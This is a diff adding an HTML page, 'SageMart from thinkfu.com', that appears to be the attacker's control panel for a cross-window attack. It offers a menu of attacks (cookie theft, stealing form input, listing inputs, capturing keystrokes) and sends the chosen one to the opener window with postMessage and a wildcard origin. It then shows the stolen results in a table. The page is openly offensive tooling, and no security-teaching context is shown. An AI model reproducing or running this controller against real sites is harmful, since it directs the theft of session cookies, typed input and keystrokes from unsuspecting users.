@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <title></title>
+  <link rel="stylesheet" href="./sagemart.css">
+  <style>
+    h3 {
+      font-family: Calibri;
+      text-align: center;
+      background: red;
+    }
+    html { 
+    background: url(https://extension.illinois.edu/herbs/images/herbs/sage.jpg) no-repeat center center fixed; 
+      -webkit-background-size: cover;
+      -moz-background-size: cover;
+      -o-background-size: cover;
+      background-size: cover;
+    }
+    body, html {
+    height: 100%;
+  }
+  </style>
+
+</head>
+<body>
+<script>
+    window.onmessage = function(msg) {
+      Update(msg.data)
+    }
+
+    var prevTime;
+    let dateEl;
+    function Update(data) {
+      if (!dateEl) {
+        dateEl = document.getElementById('date');
+      }
+      if (data && data.date !== prevTime) {
+        prevTime = data.date;
+        dateEl.innerHTML = prevTime;
+        var table = document.getElementById('results');
+        var row = document.createElement("tr");
+        table.appendChild(row);
+        
+        Object.keys(data).forEach(function (key) {
+          if (!key || key === "date") return;
+          var td = document.createElement("td");
+
+          row.appendChild(td);
+          var value = data[key];
+          if (value instanceof Array) {
+            let tb = document.createElement("table");
+            for (let v of value) {
+              let r = document.createElement('tr');
+              let d = document.createElement('td');
+              r.appendChild(d);
+              table.appendChild(r);
+              d.textContent = v;
+            }
+          }
+          td.textContent = `${value}`;
+        });
+      }
+    }
+
+    function Clear() {
+      var table = document.getElementById('results');
+      table.innerHTML = "";
+    }
+
+    function Steal() {
+      let attack = window.attacktype.value;
+      let value = window.arg.value;
+      if (attack)
+      window.opener.postMessage({
+        attack: attack,
+        arg: value
+      }, '*');
+    }
+  </script>
+    
+
+
+  <select id="attacktype">
+    <option value="">--Choose an attack--</option>
+    <option value="cookie">Cookie</option>
+    <option value="input">Steal input</option>
+    <option value="list">List inputs</option>
+    <option value="keystroke">Key strokes</option>
+  </select>
+
+
+  
+  <input id="arg" type="text" value=""></input>
+  <input id="attack" type="button" onclick="Steal()" value=" Attack! "></input>  
+  <input id="clear" type="button" onclick="Clear()" value=" Clear "></input>  
+  <div id="window">
+    <div id="toolbar">
+    <div class="top">
+      <div id="lights">
+        <div class="light red">
+          <div class="glyph">×</div>
+          <div class="shine"></div>
+          <div class="glow"></div>
+        </div>				
+        <div class="light yellow">
+          <div class="glyph">-</div>
+          <div class="shine"></div>
+          <div class="glow"></div>
+        </div>
+        <div class="light green">
+          <div class="glyph">+</div>
+          <div class="shine"></div>
+          <div class="glow"></div>
+        </div>
+      </div>
+      <div id="title">
+        <div class="folder">
+          <div class="tab"></div>
+          <div class="body"></div>
+        </div>
+        SageMart from thinkfu.com
+      </div>
+      <div id="bubble">
+        <div class="shine"></div>
+        <div class="glow"></div>
+      </div>
+    </div>
+  </div>
+  <div id="body">
+      <p> $ sagemart --command --control <br />
+      <p> Last result: <span id="date"></span> <br />
+          <table id="results">
+        <!--<tr>
+          <th>Time</th>
+          <th>Action</th>
+          <th>URL</th>
+          <th>Offending resource</th>
+          <th>Access elements</th>
+        </tr>-->
+      </table>
+    <div class="cursor"></div>	
+  </div>	
+</div>
+
+</body>
+</html>
